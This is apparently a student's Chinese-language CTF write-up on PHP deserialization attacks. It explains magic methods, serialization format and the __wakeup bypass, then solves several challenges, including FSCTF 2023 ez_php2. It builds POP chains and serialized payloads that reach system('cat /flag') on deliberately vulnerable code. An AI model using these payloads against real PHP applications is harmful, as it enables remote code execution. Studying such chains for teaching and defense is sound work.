# WEB第三节课WP

[TOC]

---

> 20233001306 张博翔 BX

## 基本理论和整理

```markdown
__destruct()  // 对象销毁时自动执行
__wakeup()  // 反序列化中自动执行
__sleep()   //方法在一个对象被序列化之前调用；
__toString()   // 将对象转换为字符串是自动触发
__invoke()     // 将对象作为函数调用时触发
__get($name)        // 访问对象中不存在的属性时触发，并将名字作为参数传入
__set($name, $value)// 对对象中不存在的属性赋值时触发，并将名字和值作为参数传入
__call($name, $args)// 调用对象中不存在的方法时触发，并将名字和参数数组作为参数传入

```



**序列化中每个字母的表示：**

| a    | array数组                                |
| :--- | :--------------------------------------- |
| b    | boolean                 判断类型         |
| d    | double                    浮点数         |
| i    | integer                    整数型        |
| o    | common object   一般的对象               |
| r    | reference                引用类型        |
| s    | string                        字符串类型 |
| C    | custom object                            |
| O    | class                          类        |
| N    | null                            空       |
| R    | pointer reference                        |
| U    | unicode string                           |

### 访问修饰符号

```PHP
public(公有) 
protected(受保护)     // %00*%00属性名
private(私有的)       // %00类名%00属性名
```

例子：

```php
<?php
class Ctf
{
    public $name = 'bx33661';
    protected $age = '19';
    private $flag = 'You are great';
}
$bx = new Ctf();
echo serialize($bx);
?>
//O:3:"Ctf":3:{s:4:"name";s:7:"bx33661";s:6:"*age";s:2:"19";s:9:"Ctfflag";s:13:"You are great";}
/*
s:6:"*age"   //*前后出现两个空白符，一个空白符长度为1，所以序列化后，该属性长度为6
s:9:"Ctfflag"   //类名Ctf前后出现两个%00空白符，所以长度为9
*/
```



### wakeup绕过

把属性增大-----达到绕过wakeup()效果 拿到flag，这是因为

>  **当序列化字符串中表示对象属性个数的数字值大于真实类中属性的个数时就会跳过__wakeup的执行**





## [FSCTF 2023]ez_php2----wp

```PHP
<?php
highlight_file(__file__);
Class Rd{
    public $ending;
    public $cl;

    public $poc;
    public function __destruct()
    {
        echo "All matters have concluded";
        die($this->ending);
    }
    public function __call($name, $arg)
    {
        foreach ($arg as $key =>$value)
        {

            if($arg[0]['POC']=="1111")
            {
                echo "1";
                $this->cl->var1 = "system";
            }
        }
    }
}


class Poc{
    public $payload;

    public $fun;

    public function __set($name, $value)
    {
        $this->payload = $name;
        $this->fun = $value;
    }

    function getflag($paylaod)
    {
        echo "Have you genuinely accomplished what you set out to do?";
        file_get_contents($paylaod);
    }
}

class Er{
    public $symbol;
    public $Flag;

    public function __construct()
    {
        $this->symbol = True;
    }

    public function __set($name, $value)
    {
        $value($this->Flag);
    }


}

class Ha{
    public $start;
    public $start1;
    public $start2;
    public function __construct()
    {
        echo $this->start1."__construct"."</br>";
    }

    public function __destruct()
    {
        if($this->start2==="11111") {
            $this->start1->Love($this->start);
            echo "You are Good!";
        }
    }
}


if(isset($_GET['Ha_rde_r']))
{
    unserialize($_GET['Ha_rde_r']);
} else{
    die("You are Silly goose!");
}
?> You are Silly goose!
```

代码审计后发现：

1. 类似可以执行代码中的格式

```php
    public function __set($name, $value)
    {
        $value($this->Flag);
    }
```

`$value`中可以利用`__set`使其值等于`system`

`$Flag` == `'cat /flag'` 

构造：==system('cat /flag')==



2. 发现Rd（）中`__call`方法

 ```php
  public function __call($name, $arg)
     {
         foreach ($arg as $key =>$value)
         {
 
             if($arg[0]['POC']=="1111")
             {
                 echo "1";
                 $this->cl->var1 = "system";
             }
         }
     }
 ```

发现其中需要满足条件：`if($arg[0]['POC']=="1111")`

3. 在利用Poc（）中的变量实现覆盖绕过

```php
$a->start2 = "11111";
$a->start1 = new Rd();
$p = new Poc();
$p->payload = ['POC'=>'1111'];
$a->start = $p->payload;
$a->start1->cl = new Er();

echo serialize($a);

//?Ha_rde_r=O:2:"Ha":3:{s:5:"start";a:1:{s:3:"POC";s:4:"1111";}s:6:"start1";O:2:"Rd":3:{s:6:"ending";N;s:2:"cl";O:2:"Er":2:{s:6:"symbol";N;s:4:"Flag";s:9:"cat /flag";}s:3:"poc";N;}s:6:"start2";s:5:"11111";}
```

最后得到flag

*FLAG：

```
flag{Y0u_a2e_S0_G00d!!!!!}
You are Good!All matters have concluded
```



## ez_ez_unserialize

```php
<?php
class X
{
    public $x = __FILE__;
    function __construct($x)
    {
        $this->x = $x;
    }
    function __wakeup()
    {
        if ($this->x !== __FILE__) {
            $this->x = __FILE__;
        }
    }
    function __destruct()
    {
        highlight_file($this->x);
        //flag is in fllllllag.php
    }
}
if (isset($_REQUEST['x'])) {
    @unserialize($_REQUEST['x']);
} else {
    highlight_file(__FILE__);
}
```

代码审计：

基本就是在`__destruct`中输出flag，但是要绕过`__wakeup()`

> PHP5<5.6.25，PHP7 < 7.0.10
>
> __wakeup函数是在php在使用反序列化函数unserialize()时，会自动调用的函数
>
> **只要序列化的中的成员数大于实际成员数，即可绕过**

最终结果：

```
x=O:1:"X":1:{s:1:"x";s:13:"fllllllag.php";}
---->
x=O:1:"X":2:{s:1:"x";s:13:"fllllllag.php";}
```

得到flag

![](C:/Users/lenovo/Desktop/%E7%B4%A0%E6%9D%90%E5%BA%93/%E7%B4%A0%E6%9D%90/image-20240811185902763.png)

## [安洵杯 2019]easy_serialize_php

根据提示传入`phpinfo`这个参数

![image-20240811223250283](C:/Users/lenovo/Desktop/%E7%B4%A0%E6%9D%90%E5%BA%93/%E7%B4%A0%E6%9D%90/image-20240811223250283.png)

找了半天找到这个提示，

......这个题有些难度，我继续学习...........

## 笔记例题的思考

### POP链第一题

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
class A{
    public $abb;
    public $sanp;

    public function __construct()
    {
        $this->abb->ttl();//3
    }
}

class B{
    public $ao;

    public function __set($a,$b){
        system($this->ao);//1
    }
}

class C{
    public $str1;
    public $str2;
    public $chance;

    public function __call($a,$b){
        if($this->str1==$this->str2){
            $this->chance->hhh=123;//2
        }
    }
}

if(isset($_POST['CTF'])) {
    unserialize($_POST['CTF']);
}
```

代码审计后发现：B类中的

```php
    public function __set($a,$b){
        system($this->ao);//这是一个破解口
    }
```

构造之后的结果：

```php
//A__construct->C__call->B__set
$a = new A();
$a->abb =new C();
$a->abb->chance =new B();
$a->abb->chance->ao = 'cat /flag';
echo serialize($a);
```



### pop链第二题

```php
<?php
error_reporting(0);
class Hello{
    public $apple;
    public $strawberry;
    public function __construct($a){
        $this -> apple = $a;
    }
    function __destruct()//4
    {
        echo $this -> apple;
    }
}

class NoNo {
    public $peach;
    public function __toString()//3
    {
        $new = $this -> peach;
        return $new();
    }
}

class Banana{
    public $orange;
    public $cherry;
    public $arg1;
    public function __call($arg1,$arg2){
        $function = $this -> orange;
        return $function();
    }
    public function __get($arg1)
    {
        $this -> cherry -> ll2('b2');
    }

}

class UkyoT{
    public $banana;
    public $mangosteen;

    public function __toString()
    {
        $long = @$this -> banana -> add();
        return $long;
    }
}

class E{
    public $e;
    public function __get($arg1){//1
        system ($this->e);
    }
}
class Heraclqs{
    public $grape;
    public $blueberry;
    public function __invoke(){//2
        if($this -> blueberry == 123) {
            return $this -> grape -> hey;
        }
    }
}

class MaiSakatoku{
    public $Carambola;
    private $Kiwifruit;

    public function __set($name, $value)
    {
        $this -> $name = $value;
        if ($this -> Kiwifruit = "hello"){
            strtolower($this-> Carambola);
        }
    }
}

if(isset($_POST['CTF'])) {
    unserialize($_POST['CTF']);
} else {
    highlight_file(__FILE__);
}
```

分析和构造之后为:

```php
//POP链如下：E-__get()<-Heraclqs-__invoke()<-NONO-toString()<-Hello-__destruct()\
$a = new Hello();
$a ->apple = new NoNo();
$a->apple->peach = new Heraclqs();
$a->apple->peach->blueberry = 123;
$a->apple->peach->grape = new E();
$a->apple->peach->grape->e = 'cat /flag';
echo serialize($a);
```

